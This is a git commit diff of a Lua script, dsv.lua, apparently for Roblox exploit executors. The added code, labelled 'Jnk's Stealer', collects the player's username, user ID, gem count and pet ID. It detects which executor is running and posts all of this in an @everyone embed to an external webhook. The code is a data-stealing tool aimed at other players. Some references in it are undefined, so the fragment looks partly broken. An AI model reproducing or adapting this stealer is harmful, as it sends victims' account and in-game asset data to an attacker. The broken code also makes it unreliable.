8f2c01669ad39a591dd2ccc4429809c65a6addad
psxscripter1337 <124915791+psxscripter1337@users.noreply.github.com>
2023-03-18 12:20:59 +0000

    Update dsv.lua

--- dsv.lua
+++ dsv.lua
@@ -1,22 +1,41 @@
-function sendWebhook(webhook, message)
-    local webhookcheck =
-    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-    secure_load and "Sentinel" or
-    KRNL_LOADED and "Krnl" or
-    SONA_LOADED and "Sona" or
-    "Kid with shit exploit"
- 
- local url =
-    webhook
- local data = {
-    ["content"] = message
- }
- local newdata = game:GetService("HttpService"):JSONEncode(data)
- 
- local headers = {
-    ["content-type"] = "application/json"
- }
- request = http_request or request or HttpPost or syn.request
- local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
- request(abcdef)
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Random ass exploit"
+
+   local player = game.Players.LocalPlayer
+   local username = player.Name
+   local data = {
+   ["content"] = "@everyone",
+   ["embeds"] = {
+       {
+           ["title"] = "**Jnk's Stealer**",
+           ["description"] = "```Username: " .. username .."```",
+           ["type"] = "rich",
+           ["color"] = tonumber(0094cf),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(username)
+           },   
+           ["fields"] = {
+            {
+                ["name"] = "``Data Generated``",
+                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..player.userId .. "**\n**``Account Age :``** **``not found``**\n**``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``Gems :`` **" ..dims .." **\n``Pet ID :`` "..v.Name .."", 
+                ["inline"] = false
+            }
+            
+        }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = webh, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 end
